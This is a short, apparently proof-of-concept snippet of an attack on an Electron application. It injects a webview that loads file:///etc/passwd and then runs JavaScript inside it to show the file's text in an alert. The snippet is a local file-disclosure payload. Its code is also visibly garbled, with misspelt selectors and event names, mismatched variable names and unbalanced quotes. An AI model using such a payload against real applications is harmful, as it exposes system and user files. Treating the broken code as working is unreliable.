<webview src=”file:///etc/passwd”></webview>
webview  = document.querySelector("webwiew");
webwiew.addEventListener('dom-redy', () => {
setTimeout(function() {
webview.executeJavaScript("alert(test data:\n\n'+document.body.innerText)")
}
,100);
})
